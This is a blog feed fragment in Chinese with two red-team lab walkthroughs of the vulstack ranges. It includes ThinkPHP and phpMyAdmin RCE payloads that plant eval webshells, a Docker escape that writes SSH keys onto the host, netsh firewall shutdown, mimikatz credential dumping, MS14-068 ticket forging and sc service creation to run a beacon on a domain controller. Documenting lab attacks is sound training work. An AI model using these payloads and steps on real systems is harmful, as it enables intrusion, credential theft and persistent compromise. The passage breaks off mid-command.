    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="0x01-网卡配置"><a href="#0x01-网卡配置" class="headerlink" title="0x01 网卡配置"></a>0x01 网卡配置</h3><p>在WEB靶机上如下，其中133网段为NAT即外网地址，195网段为内网地址</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210826103323480.png" alt="image-20210826103323480"></p><p>在域控上，如下</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210826103340891.png" alt="image-20210826103340891"></p><h3 id="0x02-启动"><a href="#0x02-启动" class="headerlink" title="0x02 启动"></a>0x02 启动</h3><p>在WEB靶机中开启phpstudy即可</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828100322172.png" alt="image-20210828100322172"></p><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><h3 id="0x01-WEB层"><a href="#0x01-WEB层" class="headerlink" title="0x01 WEB层"></a>0x01 WEB层</h3><p>打开WEB靶机地址，发现是TP5</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828100539830.png" alt="image-20210828100539830"></p><p>然后直接找了个RCE的POC进行验证</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">/?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">whoami</span></span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828112140538.png" alt="image-20210828112140538"></p><p>在验证确实存在漏洞后，进一步写入Webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cracer]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>并使用蚁剑进行连接</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828114710210.png" alt="image-20210828114710210"></p><p>之后使用CS的Web Delivery模块上线</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828122339585.png" alt="image-20210828122339585"></p><h3 id="0x02-内网-信息收集"><a href="#0x02-内网-信息收集" class="headerlink" title="0x02 内网-信息收集"></a>0x02 内网-信息收集</h3><p>首先，使用</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span><br></code></pre></td></tr></table></figure><p>寻找内网存主机，可以看到除了我们的WEB靶机就是域控了</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828165149844.png" alt="image-20210828165149844"></p><h3 id="0x03-内网-域控打法1"><a href="#0x03-内网-域控打法1" class="headerlink" title="0x03 内网-域控打法1"></a>0x03 内网-域控打法1</h3><p>首先拿下WEB服务器后可以扫描内网，可以看到我们的域控他老人家直接受永恒之蓝的影响</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828155200197.png" alt="image-20210828155200197"></p><p>这里需要注意的是，检测存在漏洞后，需要先关闭防火墙，否则下一步利用将失败，体现为虽然利用成功了但无法拿到meterpreter的session</p><p>查看防火墙状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh firewall show config<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828160430269.png" alt="image-20210828160430269"></p><p>关闭防火墙（真实环境中不建议这样做，动静太大，可以有针对性的放行端口）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828160216174.png" alt="image-20210828160216174"></p><p>再次查看，确认关闭后进行下一步动作</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828160558708.png" alt="image-20210828160558708"></p><p>此时再使用msf的永恒之蓝模块，可以直接拿到域控的meterpreter</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828160717057.png" alt="image-20210828160717057"></p><h3 id="0x04-内网-域控打法2"><a href="#0x04-内网-域控打法2" class="headerlink" title="0x04 内网-域控打法2"></a>0x04 内网-域控打法2</h3><p>在拿到WEB靶机的权限后，我们也可以先架设代理</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828162523227.png" alt="image-20210828162523227"></p><p>之后通过mimikatz导出所有的用户凭据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz lsadump::dcsync /domain:sun.com /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828174752549.png" alt="image-20210828174752549"></p><p>或者使用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">logonpasswords</span> <br></code></pre></td></tr></table></figure><p>能够直接拿到明文密码</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828182226250.png" alt="image-20210828182226250"></p><p>之后使用psexec传递hash即可</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828162558097.png" alt="image-20210828162558097"></p><p>这样我们就拿到了Beacon</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828162649714.png" alt="image-20210828162649714"></p><p>之后可以hashdump并进行进一步的权限持久化操作，这里就不再赘述了</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828162743493.png" alt="image-20210828162743493"></p><h3 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h3><p>本次打靶还是踩了一些坑的，特此记录</p><ul><li>首先是使用<code>hashdump</code>的时候可能会导出空密码，原因未知，我理解为工具的原生问题。这导致我在进行pth操作时卡了一会，后来使用mimikatz的命令才导出了正确的不是空密码的hash，并成功传递上线域控</li></ul><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828164953974.png" alt="image-20210828164953974"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94.assets/image-20210828182639136.png" alt="image-20210828182639136"></p><ul><li><ul><li>还有就是需要关闭防火墙才能成功利用永恒之蓝打下域控，原理嘛就是站在WEB服务器来讲，我们使用的<code>reverse_http</code>的payload对它来说是个正向的连接，作为WEB服务器，合理的配置是80&#x2F;443端口开放，有时候也会多个数据库的端口。其他的端口为了安全起见自然是禁止入站流量的啦。所以需要关闭防火墙。</li><li>如果是对于VPS，有端口映射那种，关闭防火墙也不好使了，这个时候可以试试使用<code>bind_tcp</code>，理论上是可以成功的，但测试时失败了，原因未知</li><li>还有一种思路是如果是高权限的话可以试试端口复用，这里没进行测试就不进一步细讲了</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>vulstack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队评估四记录</title>
    <link href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B/"/>
    <url>/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="0x01-网络环境"><a href="#0x01-网络环境" class="headerlink" title="0x01 网络环境"></a>0x01 网络环境</h3><p>我们总共拿到了3台机器，除了WEB机器需要配置双网卡外，其他的机器都只配置183网段的内网网卡即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818200846128.png" alt="image-20210818200846128"></p><h3 id="0x02-WEB服务"><a href="#0x02-WEB服务" class="headerlink" title="0x02 WEB服务"></a>0x02 WEB服务</h3><p>在官网给出了参考的学习路径，故我们启动前三个进行WEB服务的搭建</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818201441653.png" alt="image-20210818201441653"></p><p>Struts2漏洞（S2-053）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818204659123.png" alt="image-20210818204659123"></p><p>pma文件包含漏洞（CVE-2018-12613）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818202354850.png" alt="image-20210818202354850"></p><p>tomcat PUT文件上传漏洞（CVE-2017-12615）：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818202741904.png" alt="image-20210818202741904"></p><p>启动完成后，相应靶机的地址如下</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818202913310.png" alt="image-20210818202913310"></p><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><h3 id="0x01-Struts2"><a href="#0x01-Struts2" class="headerlink" title="0x01 Struts2"></a>0x01 Struts2</h3><p>使用工具进行检测</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818204746207.png" alt="image-20210818204746207"></p><p>根据得到的根目录上传Webshell</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818204754787.png" alt="image-20210818204754787"></p><p>冰蝎连接</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818204908875.png" alt="image-20210818204908875"></p><h3 id="0x02-PMA文件包含"><a href="#0x02-PMA文件包含" class="headerlink" title="0x02 PMA文件包含"></a>0x02 PMA文件包含</h3><p>根据Poc进行验证，输入查询语句并尝试包含Session文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`SELECT <span class="hljs-string">&#x27;&lt;?=@eval($_GET[g]);?&gt;&#x27;</span>;`<br></code></pre></td></tr></table></figure><p>包含成功，可以进行利用</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210818211628129.png" alt="image-20210818211628129"></p><p>接着执行查询，使得包含后能够生成一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT `&lt;?php fputs(fopen(<span class="hljs-string">&quot;a.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);?&gt;`; <br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823185416742.png" alt="image-20210823185416742"></p><p>访问后在根目录下可以看到生成的一句话木马文件</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823185451754.png" alt="image-20210823185451754"></p><p>蚁剑连接</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823185543984.png" alt="image-20210823185543984"></p><h3 id="0x03-Tomcat-PUT文件上传"><a href="#0x03-Tomcat-PUT文件上传" class="headerlink" title="0x03 Tomcat PUT文件上传"></a>0x03 Tomcat PUT文件上传</h3><p>上传Webshell</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823190343122.png" alt="image-20210823190343122"></p><p>冰蝎连接</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823190437147.png" alt="image-20210823190437147"></p><h3 id="0x04-docker逃逸"><a href="#0x04-docker逃逸" class="headerlink" title="0x04 docker逃逸"></a>0x04 docker逃逸</h3><p>这里尝试了诸多方法都失败了，最后发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p>能够看到物理机的磁盘，按理来说这是要用特权模式启动容器才可能出现的情况，这个可能是环境本身的原因？</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823203420463.png" alt="image-20210823203420463"></p><p>但既然有我们就可以好好利用了，就用这个容器进行逃逸吧</p><p>挂载磁盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /test<br>mount /dev/sda1 /test<br></code></pre></td></tr></table></figure><p>这里有点小坑，正常来说<code>authorized_keys</code>文件的权限应该是644，但本机上没有该文件，然后使用了如下命令写入自己的ssh公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;your-keys&gt;&#x27;</span> &gt; /test/home/ubuntu/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>这个新生成的文件是640权限的，这导致使用ssh登陆时依旧需要WEB机器的密码，然后这个容器中是没有<code>sudo</code>和<code>chmod</code>命令的，无法在容器中更改文件的权限</p><p>我把这个算作异常情况，所以直接登上去改成了644</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ubuntu@ubuntu:~/.ssh$ sudo <span class="hljs-built_in">chmod</span> 644 authorized_keys<br></code></pre></td></tr></table></figure><p>后记：在寻找更佳的解决方案的时候发现有个方案是先覆写WEB机器的公钥文件然后复制，<a href="https://www.cnblogs.com/PANDA-Mosen/p/13118210.html">参考</a></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824164419763.png" alt="image-20210824164419763"></p><p>在修改完成后就能正常免密登陆了</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823212439920.png" alt="image-20210823212439920"></p><p>这里试着使用脏牛漏洞提权，但是失败了，原因未知</p><h3 id="0x05-内网渗透"><a href="#0x05-内网渗透" class="headerlink" title="0x05 内网渗透"></a>0x05 内网渗透</h3><p>我们的目的最后是拿下域控，边缘机器能够架设路由的话就问题不大，所以我们就直接上线msf了。上线msf后添加路由</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823214932367.png" alt="image-20210823214932367"></p><p>添加路由后使用MS17-010的扫描模块进行扫描，发现129和130两台机子都在影响范围内</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210823215531820.png" alt="image-20210823215531820"></p><h3 id="0x06-非预期解-直接拿下域控"><a href="#0x06-非预期解-直接拿下域控" class="headerlink" title="0x06 非预期解-直接拿下域控"></a>0x06 非预期解-直接拿下域控</h3><p>这里就发生了比较有趣的事情，在msf上，对两台机器的MS17-010模块的利用都是以失败告终了（130的图忘了截了）</p><p>无论是架设代理还是使用<code>bind_tcp</code>，都是利用失败，原因未知</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824140827617.png" alt="image-20210824140827617"></p><p>然后我使用了原生的方程式工具直接把域控的机器打下来了。。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824102703218.png" alt="image-20210824102703218"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824105530530.png" alt="image-20210824105530530"></p><p>虽然有些突然，但这也是域中的机器，习惯性地收集些信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net user /domain<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824115845986.png" alt="image-20210824115845986"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net time /domain<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824115956134.png" alt="image-20210824115956134"></p><p>dump了hash拿去解密能够拿到域控的密码</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824170439778.png" alt="image-20210824170439778"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824110814623.png" alt="image-20210824110814623"></p><h3 id="0x07-非预期解-尝试拿下PC机"><a href="#0x07-非预期解-尝试拿下PC机" class="headerlink" title="0x07 非预期解-尝试拿下PC机"></a>0x07 非预期解-尝试拿下PC机</h3><p>douser的密码没能解出（但理论上可以传递哈希），但是根据官方的提示我们能在WEB机器的bash执行历史记录中发现该用户的密码</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824141127059.png" alt="image-20210824141127059"></p><p>但是尝试进行哈希传递时失败了，这里卡了好久</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824170912053.png" alt="image-20210824170912053"></p><p>Google了一下，报错原因可能是域的配置出现了问题</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824120337949.png" alt="image-20210824120337949"></p><p>使用原生的PsExec也失败了，然后两天后还是没找到方法，域控也拿到了，遂在该解法中放弃了这台机器</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824135729926.png" alt="image-20210824135729926"></p><h3 id="0x08-预期解-上线PC"><a href="#0x08-预期解-上线PC" class="headerlink" title="0x08 预期解-上线PC"></a>0x08 预期解-上线PC</h3><p>这里参考别的师傅的正常打法再完整走一遍流程</p><p>正常来说我们应该能通过MS17-010漏洞拿下了PC机的Meterpreter，但这里使用msf的<code>web_delivery</code>模块时还是会出问题，这里我直接虚拟机登录后上线CS了</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824175417973.png" alt="image-20210824175417973"></p><h3 id="0x09-预期解-域提权"><a href="#0x09-预期解-域提权" class="headerlink" title="0x09 预期解-域提权"></a>0x09 预期解-域提权</h3><p>无关的信息收集就暂不列出了，这里是使用MS17-068漏洞进行提权并拿下域控</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net computers <span class="hljs-comment">#CS独有命令</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824182227452.png" alt="image-20210824182227452"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami /all <span class="hljs-comment">#获取域用户SID</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824175751164.png" alt="image-20210824175751164"></p><p>在之前我们提到过泄露的域用户和对应的密码，可以用它生成所需的凭据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ms14<span class="hljs-literal">-068</span>.exe <span class="hljs-literal">-u</span> douser@demo.com <span class="hljs-literal">-p</span> Dotest123 <span class="hljs-literal">-s</span> S<span class="hljs-literal">-1-5-21-979886063-1111900045-1414766810-1107</span> <span class="hljs-literal">-d</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">183.130</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824181208030.png" alt="image-20210824181208030"></p><p>之后清除内存中的票据并将生成的票据注入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kerberos::purge<br>kerberos::ptc 生成的票据名<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824181930154.png" alt="image-20210824181930154"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824182116812.png" alt="image-20210824182116812"></p><p>进行权限验证，尝试访问域控</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\WIN<span class="hljs-literal">-ENS2VR5TR3N</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210824182348372.png" alt="image-20210824182348372"></p><h3 id="0x0A-预期解-上线域控"><a href="#0x0A-预期解-上线域控" class="headerlink" title="0x0A 预期解-上线域控"></a>0x0A 预期解-上线域控</h3><p>在确定拿到域管权限后可以使用sc上线CS</p><p>首先是关闭防火墙</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N create <span class="hljs-keyword">closewall </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N start <span class="hljs-keyword">closewall</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825162705351.png" alt="image-20210825162705351"></p><p>制作木马并上传PC机器</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825171126179.png" alt="image-20210825171126179"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825163538040.png" alt="image-20210825163538040"></p><p>使用<code>copy</code>命令上传到域控</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">copy</span> C:\Users\douser\Documents\beacon.exe \\WIN<span class="hljs-literal">-ENS2VR5TR3N</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825163639435.png" alt="image-20210825163639435"></p><p>使用sc创建服务并启动</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N create <span class="hljs-keyword">cs</span> binpath= <span class="hljs-string">&quot;c:\beacon.exe&quot;</span><br><span class="hljs-keyword">sc</span> \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N start <span 